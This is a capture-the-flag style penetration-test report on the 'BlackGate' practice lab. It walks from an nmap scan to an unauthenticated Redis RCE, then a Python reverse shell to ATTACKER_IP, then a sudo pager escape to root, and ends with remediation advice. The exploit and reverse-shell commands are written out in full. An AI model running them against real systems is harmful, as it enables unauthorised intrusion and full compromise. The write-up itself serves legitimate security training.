# PG Practice BlackGate - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-3

---

## 0. Lesson Learned

Even hard level boxes can seem easy when you've seen it before.

---

## 1. Executive Summary

An assessment of the BlackGate target system identified critical vulnerabilities that allowed unauthenticated remote code execution via an exposed Redis service, followed by privilege escalation through a misconfigured sudo binary. Successful exploitation resulted in full root access to the system.

---

## 2. Scope

- **Target:** 192.168.189.176
- **Environment:** PG Practice BlackGate
- **Testing Window:** 2026-4-3
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 192.168.189.176 -T4 -oA blackgate_tcp
```

Revealing two open services:

- 22/tcp - OpenSSH 8.3p1 Ubuntu
- 6379/tcp - Redis key-value store 4.0.14

The target exposes SSH and Redis service. Redis is known to be exploitable when misconfigured.

---

## 5. Enumeration

Redis was identified as accessible remotely and likely misconfigured.

Redis running without proper authentication can allow remote code execution through module loading techniques.

---

## 6. Initial Access

A Redis RCE exploit was used to gain a reverse shell:

```
python redis-rce.py -r 192.168.189.176 -p 6379 -L ATTACKER_IP -f exp_lin.so
```

The exploit successfully triggered a reverse shell from the target.

A stable shell was established:

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

A stable shell was obtained as unprivileged user `prudence`

---

## 7. Post-Exploitation

User-level enumeration was performed:

```
cat /home/prudence/notes.txt
```

The note suggests a custom binary `redis-status` exists and may be relevant.

Sudo permissions were checked:

```
sudo -l
```

Revealing the user `prudence` can execute the `/usr/local/bin/redis-status` binary as root without a password.

---

## 8. Privilege Escalation

The binary required an authorization key:

```
sudo /usr/local/bin/redis-status
```

The binary was analyzed using strings:

```
strings /usr/local/bin/redis-status
```

Revealing the hard-coded authorization key:

```
ClimbingParrotKickingDonkey321
```

The binary was executed with elevated privileges:

```
sudo /usr/local/bin/redis-status
```

The output invokes a pager (`less`) as root.

A shell was spawned via the pager:

```
!/bin/sh
```

The pager allowed command execution, resulting in a root shell.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/prudence/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Unauthenticated Redis Service Exposure

**Severity:** Critical

**Description:**
The Redis service was exposed without authentication, allowing remote interaction with the database.

**Impact:**
Attackers could execute commands on the Redis instance, potentially leading to remote code execution and initial system compromise.

**Recommendation:**
Enable authentication for Redis, bind the service to localhost or restrict access via firewall rules, and enable protected mode.

### **Finding:** Hardcoded Authorization Key in Application Binary

**Severity:** High

**Description:**
An application binary (e.g., `redis-status`) contained a hardcoded authorization key that could be retrieved through static analysis.

**Impact:**
Attackers could extract the key and bypass authentication controls to execute privileged functionality.

**Recommendation:**
Remove hardcoded credentials from application binaries, implement secure key storage mechanisms, and rotate any exposed keys.

### **Finding:** Insecure Sudo Configuration Allowing Shell Escape via Pager

**Severity:** Critical

**Description:**
A user was permitted to execute a binary (e.g., `redis-status`) via sudo that invoked a pager, allowing shell escape.

**Impact:**
Attackers could exploit the pager functionality to spawn a root shell and achieve full system compromise.

**Recommendation:**
Remove unnecessary sudo privileges, disable pager invocation or sanitize the execution environment, and avoid granting sudo access to binaries capable of shell escape.

---

## 11. Appendix

Redis RCE -
[https://github.com/jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)